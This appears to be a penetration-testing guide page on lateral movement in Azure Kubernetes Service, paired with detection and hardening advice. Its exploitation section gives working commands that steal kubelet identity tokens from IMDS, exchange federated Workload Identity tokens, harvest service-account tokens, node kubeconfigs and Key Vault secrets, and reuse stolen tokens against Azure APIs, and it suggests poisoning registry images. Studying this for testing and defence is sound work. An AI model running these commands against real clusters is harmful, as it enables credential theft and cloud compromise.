---
cstg_id: CSTG-AZURE-AKS-LATERAL
title: "AZURE Aks - Lateral Movement"
provider: azure
service: aks
phase: lateral-movement
required_access: assumed-breach
required_permissions:
  - "Kubernetes RBAC: create/exec pods; get/list secrets; create serviceaccounts/token across namespaces"
  - "Microsoft.ContainerService/managedClusters/listClusterAdminCredential/action"
  - "Microsoft.ContainerService/managedClusters/runCommand/action"
  - "Microsoft.Compute/virtualMachineScaleSets/virtualMachines/runCommand/action"
  - "Access to the kubelet managed identity via IMDS (no Azure permission required from inside a pod/node)"
  - "Workload Identity federated service-account token exchange"
tools:
  - kubectl
  - az cli (azure-cli)
  - Instance Metadata Service (IMDS)
  - kubeletctl
  - Peirates
  - curl
  - azure-workload-identity token exchange
  - kube-apiserver
references:
  - "https://learn.microsoft.com/en-us/azure/aks/concepts-identity"
  - "https://learn.microsoft.com/en-us/azure/aks/use-managed-identity"
  - "https://learn.microsoft.com/en-us/azure/aks/workload-identity-overview"
  - "https://learn.microsoft.com/en-us/entra/identity/managed-identities-azure-resources/how-to-use-vm-token"
  - "https://learn.microsoft.com/en-us/azure/aks/csi-secrets-store-driver"
  - "https://kubernetes.io/docs/concepts/security/pod-security-standards/"
  - "https://hackingthe.cloud/azure/abusing-managed-identities/"
  - "https://microsoft.github.io/Threat-Matrix-for-Kubernetes/"
license: CC BY-SA 4.0
---

## Summary

This page covers lateral movement involving Azure Kubernetes Service: moving from one foothold to additional workloads, namespaces, nodes, clusters, and — most importantly — from inside the cluster onto the **Azure control/data plane** and back. AKS sits at the boundary of two worlds, so its lateral-movement surface is unusually rich:

- **Pod -> pod / namespace -> namespace** inside the cluster, using harvested service-account tokens, shared secrets, and lack of network policy.
- **Pod -> node** via container escape (privileged/host-mount pods), then node -> cluster (kubelet credentials) and node -> Azure (kubelet identity via IMDS).
- **Pod/node -> Azure** by stealing the **kubelet managed-identity** token from IMDS, by exchanging a **Workload Identity** federated token for an Entra access token, or by pulling secrets the **CSI Key Vault driver** mounted into pods.
- **Azure -> cluster** in the reverse direction, using credential-pull or `command invoke` (covered as escalation in [AKS privilege escalation](../03-privilege-escalation/azure-aks-privesc.md)) to reach workloads, then onward to other Azure resources the cluster's identities can touch.

The objective is to traverse from the foothold established in the [enumeration](../02-services/azure-aks-enum.md) and [privilege escalation](../03-privilege-escalation/azure-aks-privesc.md) phases to high-value targets: other clusters, the subscription, Key Vault contents, container registries, storage, databases, and the Entra directory — wherever the reachable identities have rights.

## Prerequisites

- An in-cluster foothold (code execution in a pod, a service-account token, or a kubeconfig) **or** an Azure principal able to reach into the cluster (`listClusterAdminCredential`/`runCommand`).
- For node/Azure crossover: the ability to reach IMDS (`169.254.169.254`) from a pod or node, which by default requires only network egress to the link-local address — no Azure permission is checked at the metadata endpoint; access is gated only by network policy and whether the pod can reach the host network.
- For Workload Identity exchange: a pod mounted with a federated service-account token (projected at `/var/run/secrets/azure/tokens/azure-identity-token`) and the corresponding identity's client/tenant IDs.
- Network reachability between the foothold and the target (intra-cluster, the node subnet, IMDS, Azure data-plane endpoints, or peered VNets).

## Enumeration

Identify the credentials and reachable identities available from the current foothold:

```bash
# The pod's own service-account token and CA
cat /var/run/secrets/kubernetes.io/serviceaccount/token
cat /var/run/secrets/kubernetes.io/serviceaccount/namespace

# Workload Identity federated token (present only on opted-in pods)
cat /var/run/secrets/azure/tokens/azure-identity-token 2>/dev/null
env | grep -i AZURE   # AZURE_CLIENT_ID, AZURE_TENANT_ID, AZURE_FEDERATED_TOKEN_FILE, AZURE_AUTHORITY_HOST

# What the current SA can reach across the cluster
kubectl auth can-i --list
kubectl get secrets -A 2>/dev/null
kubectl get pods -A -o wide

# Reachability to IMDS and to the API server
curl -s -m 3 -H "Metadata:true" "http://169.254.169.254/metadata/instance?api-version=2021-02-01"
```

## Misconfigurations & Findings

- **No NetworkPolicy** — any pod can reach any other pod, the API server, IMDS, and Azure endpoints, removing all intra-cluster segmentation.
- **IMDS reachable from pods** — pods on the host network (or simply with egress to the link-local address, depending on CNI) can pull the kubelet identity token, granting that identity's Azure roles to arbitrary workloads.
- **Over-privileged kubelet identity** — Contributor/AcrPull-and-Push/Key Vault/Storage roles on the kubelet identity turn any pod into a holder of those Azure rights.
- **Over-scoped Workload Identity federation** — federated SAs mapped to broadly privileged identities, or wildcard federation subjects, let a compromised workload assume powerful Entra identities.
- **Secrets mounted broadly via CSI Key Vault driver** — `SecretProviderClass` objects exposing high-value Key Vault secrets to many pods.
- **Shared/automounted service-account tokens** — default-SA tokens with real RBAC, reachable by any pod in the namespace.
- **Flat networking to other Azure resources** — node subnet with line-of-sight (and identity rights) to databases, storage, other clusters, or peered VNets.
- **Reused images/credentials across clusters** — a registry credential or image secret usable to pivot into other clusters/environments.

## Exploitation

### Steal the kubelet managed-identity token via IMDS

Every node runs as the kubelet identity. From a pod that can reach the node's metadata endpoint (host network, or a CNI that does not block link-local egress) — or from the node directly after a container escape — request an Entra access token for any Azure resource:

```bash
# ARM token (control plane)
curl -s -H "Metadata:true" \
  "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/"

# Key Vault, Storage, Graph, ACR tokens by changing 'resource'
curl -s -H "Metadata:true" \
  "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://vault.azure.net"
```

Use the returned bearer token directly against ARM or data-plane APIs. The reachable scope is exactly the kubelet identity's role assignments (enumerated in the [enumeration](../02-services/azure-aks-enum.md) phase) — frequently AcrPull on a registry, and often more.

### Exchange a Workload Identity federated token for an Entra token

Pods opted into Azure Workload Identity carry a projected OIDC token. Exchange it at the Entra token endpoint for an access token for the federated user-assigned identity, then act as that identity:

```bash
FED=$(cat "$AZURE_FEDERATED_TOKEN_FILE")
curl -s -X POST "${AZURE_AUTHORITY_HOST}${AZURE_TENANT_ID}/oauth2/v2.0/token" \
  -d "client_id=${AZURE_CLIENT_ID}" \
  -d "scope=https://management.azure.com/.default" \
  -d "grant_type=client_credentials" \
  -d "client_assertion_type=urn:ietf:params:oauth:client-assertion-type:jwt-bearer" \
  -d "client_assertion=${FED}"
# Resulting access_token carries the workload identity's Azure RBAC rights
```

This moves laterally from a single workload into whatever the federated identity can reach (Key Vault, Storage, Cosmos DB, other resource groups), and is reachable by anyone who compromises that pod.

### Container escape to node, then node-wide credential harvest

A privileged or host-mounting pod (see the [privesc](../03-privilege-escalation/azure-aks-privesc.md) pod manifests) escapes to the node. From the node:

```bash
# Kubelet client cert / kubeconfig -> act as the node identity against the API server
cat /var/lib/kubelet/kubeconfig
ls /var/lib/kubelet/pki

# Azure node config holds the kubelet identity client id and cloud config
cat /etc/kubernetes/azure.json

# Every running container's projected SA tokens and mounted secrets are readable from the host
find /var/lib/kubelet/pods -name token 2>/dev/null
```

The node's kubelet kubeconfig authenticates to the API server as `system:node:<name>`, and the harvested per-pod tokens let the attacker impersonate other workloads' service accounts.

### Harvest service-account tokens and mounted Key Vault secrets

```bash
# Read SA token secrets cluster-wide (if RBAC permits) and reuse as bearer tokens
kubectl get secrets -A -o json | jq -r '.items[]
  | select(.type=="kubernetes.io/service-account-token")
  | "\(.metadata.namespace)/\(.metadata.name): \(.data.token)"' | head

# CSI Key Vault driver mounts secrets into pods at the configured mountPath
kubectl get secretproviderclasses -A -o yaml   # find which vault/secrets, which pods
kubectl exec -n <ns> <pod> -- ls /mnt/secrets-store
kubectl exec -n <ns> <pod> -- cat /mnt/secrets-store/<secret>
```

### Pod-to-pod / namespace-to-namespace pivoting

With no NetworkPolicy, a compromised pod reaches services in other namespaces (databases, internal APIs, the dashboard) over the pod network:

```bash
# Enumerate services and endpoints to pivot to
kubectl get svc,endpoints -A -o wide
# From inside the pod, hit another namespace's service
curl -s http://<svc>.<other-ns>.svc.cluster.local:<port>/
```

Minted or harvested tokens for service accounts in other namespaces are then used to expand the foothold (`kubectl --token=<stolen> ...`).

### Use stolen Azure tokens to reach other resources

With a kubelet/workload-identity token, pivot onto the broader Azure estate the identity can reach — for example pulling secrets from Key Vault, reading/writing storage, pulling or poisoning images in ACR (supply-chain pivot back into the same or other clusters), or enumerating and acting on other resource groups:

```bash
TOKEN=<access-token-from-imds-or-exchange>
# Key Vault
curl -s -H "Authorization: Bearer $TOKEN" \
  "https://<vault>.vault.azure.net/secrets?api-version=7.4"
# ARM resource enumeration with the stolen identity
curl -s -H "Authorization: Bearer $TOKEN" \
  "https://management.azure.com/subscriptions?api-version=2022-12-01"
```

If the kubelet identity has AcrPush, poisoning a base image that other clusters pull is a powerful cross-environment lateral path.

### Azure-to-cluster reach (reverse direction)

An Azure principal with `runCommand` or admin-credential rights (see privesc) reaches the cluster from outside, then uses the in-cluster steps above to move onward to whatever the cluster identities can touch — a common path from a compromised CI/CD or operator identity into production workloads.

## Detection & Logging

- **Azure Activity Logs** record the Azure-plane crossover and reverse-direction reach: `listClusterAdminCredential/action`, `runCommand/action`, node-VMSS `runCommand`, and the downstream actions performed with stolen identity tokens (e.g. Key Vault/Storage/ACR control-plane operations attributed to the kubelet or workload identity).
- **Entra ID sign-in logs** record managed-identity and workload-identity token acquisitions and federated `client_assertion` token exchanges as service-principal sign-ins (filter on the identity's `appId`); an identity signing in from an unexpected pattern, or a federated exchange from an unusual context, is a key signal.
- **Kubernetes audit log** (`kube-audit` via AKS diagnostic settings) captures secret reads, TokenRequest calls, `exec`/`attach` into pods, and impersonation — where diagnostic settings are enabled.
- **Microsoft Defender for Containers** alerts on IMDS access from pods, container escape and privileged-pod behavior, anomalous secret access, and lateral pod-to-pod activity; **Defender for Cloud** correlates the resulting Azure data-plane access (Key Vault/Storage) back to the originating identity.
- Key Vault data-plane access from the kubelet/workload identity appears in **Key Vault diagnostic logs**; storage/ACR access appears in their respective resource logs.

## Remediation & Hardening

- Enforce default-deny **NetworkPolicy**; block pod egress to IMDS (`169.254.169.254`) for workloads that do not need it, and avoid `hostNetwork` pods.
- Keep the kubelet identity strictly least-privileged (ideally only AcrPull on the specific registry); never grant it Contributor/Owner or broad Key Vault/Storage roles.
- Prefer **Workload Identity** over the shared kubelet identity for per-pod Azure access, and scope each federated identity narrowly; constrain federation subjects to exact service accounts.
- Enforce Pod Security (restricted) / Azure Policy for AKS to prevent privileged and host-mounting pods (closing the container-escape path), and disable `automountServiceAccountToken` by default.
- Scope CSI Key Vault `SecretProviderClass` mounts to the minimum secrets per workload; rotate secrets and use short-lived credentials.
- Segment node subnets and limit VNet peering/firewall reach so a compromised node cannot reach unrelated databases, storage, or other clusters.
- Enable AKS diagnostic settings, Microsoft Defender for Containers, and Key Vault/Storage/ACR logging; export to a SIEM and alert on IMDS-from-pod, federated token exchange, and credential-pull events.

## Tools

- **kubectl** — pod exec/create, secret and token harvesting, impersonation, cross-namespace pivoting.
- **curl / IMDS** — pull kubelet managed-identity tokens and perform federated token exchange.
- **az cli** — reverse-direction reach (`command invoke`, node `run-command`) and acting with stolen tokens against ARM/data-plane.
- **kubeletctl / Peirates** — automate kubelet abuse, token/secret theft, node escape, and IMDS-based identity capture from a pod.
- **azure-workload-identity token exchange** — convert a projected federated token into an Entra access token.

## References

- AKS identity and access concepts — Microsoft Learn
- Use a managed identity in AKS — Microsoft Learn
- Azure Workload Identity overview — Microsoft Learn
- Acquire tokens from a VM/instance metadata endpoint — Microsoft Learn
- AKS CSI Secrets Store (Key Vault) driver — Microsoft Learn
- Pod Security Standards — kubernetes.io
- Abusing managed identities — hackingthe.cloud
- Threat Matrix for Kubernetes — Microsoft
